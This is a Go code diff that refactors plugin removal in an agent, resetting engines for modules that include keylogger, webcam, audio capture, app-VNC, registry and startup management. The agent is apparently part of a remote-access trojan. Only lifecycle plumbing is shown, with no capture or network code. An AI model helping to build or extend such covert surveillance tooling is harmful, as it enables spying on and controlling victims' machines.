@@ -877,15 +877,59 @@ func (a *Agent) handlePluginRemoval(ctx context.Context, pluginIDs []string) err
 	if a.plugins != nil {
 		pluginRoot = strings.TrimSpace(a.plugins.Root())
 	}
-	remoteRemoved := false
 
 	for _, rawID := range pluginIDs {
 		id := strings.TrimSpace(rawID)
 		if id == "" {
 			continue
 		}
-		if strings.EqualFold(id, plugins.RemoteDesktopEnginePluginID) {
-			remoteRemoved = true
+
+		// Instant update logic: if a plugin is removed/updated, reset its engine
+		switch {
+		case strings.EqualFold(id, plugins.RemoteDesktopEnginePluginID):
+			if err := a.resetModuleEngine(ctx, "remote-desktop", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "webcam-engine"):
+			if err := a.resetModuleEngine(ctx, "webcam-control", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "keylogger-engine"):
+			if err := a.resetModuleEngine(ctx, "keylogger", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "audio-engine"):
+			if err := a.resetModuleEngine(ctx, "audio-control", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "appvnc-engine"):
+			if err := a.resetModuleEngine(ctx, "app-vnc", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "filemanager-engine"):
+			if err := a.resetModuleEngine(ctx, "file-manager", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "taskmanager-engine"):
+			if err := a.resetModuleEngine(ctx, "task-manager", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "tcpconnections-engine"):
+			if err := a.resetModuleEngine(ctx, "tcp-connections", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "registry-engine"):
+			if err := a.resetModuleEngine(ctx, "registry", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "startup-engine"):
+			if err := a.resetModuleEngine(ctx, "startup-manager", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
+		case strings.EqualFold(id, "trigger-engine"):
+			if err := a.resetModuleEngine(ctx, "trigger-monitor", id); err != nil {
+				resultErr = combineErrors(resultErr, err)
+			}
 		}
 
 		if a.modules != nil {
@@ -920,12 +964,6 @@ func (a *Agent) handlePluginRemoval(ctx context.Context, pluginIDs []string) err
 					resultErr = combineErrors(resultErr, fmt.Errorf("remove plugin %s: %w", id, err))
 				}
 			}
-		}
-	}
-
-	if remoteRemoved {
-		if err := a.resetRemoteDesktopEngine(ctx); err != nil {
-			resultErr = combineErrors(resultErr, err)
 		}
 	}
 
@@ -1130,40 +1168,6 @@ func (a *Agent) removePluginManifestEntries(pluginIDs []string) {
 	}
 }
 
-func (a *Agent) resetRemoteDesktopEngine(ctx context.Context) error {
-	if a.modules == nil {
-		return nil
-	}
-
-	module := a.modules.remoteDesktopModule()
-	if module == nil {
-		return nil
-	}
-
-	module.mu.Lock()
-	previous := module.engine
-	module.engine = nil
-	module.requiredVersion = ""
-	module.mu.Unlock()
-
-	if previous != nil {
-		previous.Shutdown()
-	}
-
-	var resultErr error
-	if err := a.modules.DeactivatePlugin(ctx, plugins.RemoteDesktopEnginePluginID); err != nil {
-		resultErr = combineErrors(resultErr, err)
-	}
-
-	runtime := a.moduleRuntime()
-	if ctx == nil {
-		ctx = context.Background()
-	}
-	if err := module.configure(ctx, runtime); err != nil {
-		resultErr = combineErrors(resultErr, err)
-	}
-	return resultErr
-}
 
 func combineErrors(a, b error) error {
 	if a == nil {
